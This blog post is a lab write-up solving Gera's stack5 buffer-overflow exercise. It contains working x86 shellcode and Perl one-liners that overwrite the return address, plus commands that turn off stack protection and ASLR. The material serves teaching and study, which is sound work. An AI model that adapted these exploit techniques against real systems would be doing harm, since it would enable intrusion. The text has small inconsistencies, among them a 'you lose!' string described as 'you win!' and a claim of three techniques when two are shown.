Gera's Warming Up on Stack #5 - Solutions
=========================================
date: 05/Jan/2013
summary: Solutions for Gera's Warming up on Stack #5 program.
tags: exploit, ctf

Following is the part 5 in the series of posts I started back in August 2012 with an aim to provide an analysis and possible solutions for the vulnerable programs provided by [Gera](http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=researcher&name=Gerardo_Richarte) at his [Insecure Programming](http://community.corest.com/%7Egera/InsecureProgramming/) by example page.

This post follows the [Gera's Warming Up on Stack #4 - Solutions](https://7h3ram.github.io/posts/20130104_geras-wuos-stack4-solutions.html) post and if you have not read it, I request you to please do so. Most of the concepts are very similar and since they have been already talked about, I'll not be reiterating them here.

Let's get started. Below is the source for the vulnerable [stack5.c](http://community.corest.com/%7Egera/InsecureProgramming/stack5.html) program:

```c
/* stack5.c                                     *
 * specially crafted to feed your brain by gera */
int main() {
    int cookie;
    char buf[80];
    printf(*buf: %08x cookie: %08x\n*, &buf, &cookie);
    gets(buf);
    if (cookie == 0x000a0d00)
        printf(*you lose!\n*);
}
```

The above program too accepts user-input through the gets function and then looks for a specific value in a local variable named `cookie`. If this value is equal to a certain pre-defined constant, `printf` function is used to show a `you win!` message to the user. There is no direct means of modifying the content of the `cookie` variable. The `gets` function will keep reading from the stdin device until it encounters a newline or EoF character. Since this reading loop fails to honor the size of the destination buffer, a classic buffer overflow vulnerability is introduced in the program. Our aim is to leverage this vulnerability and exploit this program so that it print the `you win!` message to stdout.

Here are a few observations that could be made by looking at the source of the program:

1.  Since it is defined prior to `buf`, the `cookie` would be placed at
    a higher memory address on the program stack, just below the saved
    registers from the function prologue
2.  The `buf` character array would be at an offset of at least 80B from
    `cookie`
3.  The `gets` call would accept unbounded user-input within `buf` array
    and hence it provides a mechanism to alter the call stack contents
4.  Interestingly, the `you win!` statement is missing from this
    example. As such, gaining control over `cookie` or EIP alone won't
    help with the completion of this example.

Stack layout for [stack5.c](http://community.corest.com/%7Egera/InsecureProgramming/stack5.html) is identical to [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) as already outlined in the [Gera's Warming Up on Stack #1 - Solutions](https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html) post.

Here are a few solutions I could think of to get the `you win!` message printed:

-   Solution #1: Inject a NOP-prefixed `printf(you win!)` shellcode and
    overwrite EIP with its address
-   Solution #2: Inject a NOP-prefixed `printf(you win!)` shellcode
    through an environment var and overwrite EIP with its address

Here's a brief description of the test system:

```
# cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
Linux 2.6.38 i686 GNU/Linux
gcc (Ubuntu 4.4.3-4ubuntu5) 4.4.3
vendor_id   : GenuineIntel
model       : 37
model name  : Intel(R) Core(TM) i3 CPU       M 350  @ 2.27GHz
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc up pni monitor ssse3 lahf_l
```

Solution #1: Inject a NOP-prefixed printf(you win!) shellcode and overwrite EIP with its address
-------------------------------------------------------------------------------------------------

Here's the GCC commandline to prepare [stack4.c](http://community.corest.com/%7Egera/InsecureProgramming/stack4.html) for Solution #1:

```
# gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack5 stack5.c 2>/dev/null ; readelf -l stack5 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
#
# echo 0 >/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space
0
```

The Null-free, NOP-prefixed `printf(you win!)` shellcode we used to exploit [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) in the [Gera's Warming Up on Stack #1 - Solutions](https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html) post could be reused here:

```
# ./stack5
buf: bffff4c4 ``cookie``: bffff514
#
# ./stack5
buf: bffff4c4 ``cookie``: bffff514
# ./stack5
buf: bffff4c4 ``cookie``: bffff514
#
# perl -e 'print *\x90*x51 . *\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21* . *\xc4\xf4\xff\xbf*' | ./stack5
buf: bffff4c4 ``cookie``: bffff514
you win!#
```

Solution #2: Inject a NOP-prefixed printf(you win!) shellcode through an environment var and overwrite EIP with its address
----------------------------------------------------------------------------------------------------------------------------

Lets get straight to the exploitation:

```
# echo $WINCODE | hexdump -C
00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
00000028
#
# ./getenvaddr WINCODE ./stack5
[+] WINCODE: 0xbffff726
#
# perl -e 'print *\x90*x88 . *\x26\xf7\xff\xbf*' | ./stack5
buf: bffff4c4 ``cookie``: bffff514
you win!
```

So, we have now successfully exploited the [stack5.c](http://community.corest.com/%7Egera/InsecureProgramming/stack5.html) program through three different techniques. Depending on the motive of your exploitation attempt, other techniques could be devised and some, mentioned here, be rejected.

Like I said, earlier, these solutions are not practical anymore. They just serve the purpose of understanding how exploits used to work before mitigation features were introduced in modern systems. But, as with everything else, understanding basics is really important. As mitigation features mature, exploitation techniques become increasingly complex. And to understand those, we need to build upon the solid foundation of basic concepts, like those discussed on this and other blogs.

This was the last post in the *Geras' Warming Up on Stack* series. I plan to start another series for *Gera's Advanced Buffer Overflows* examples. Stay tuned for further updates.
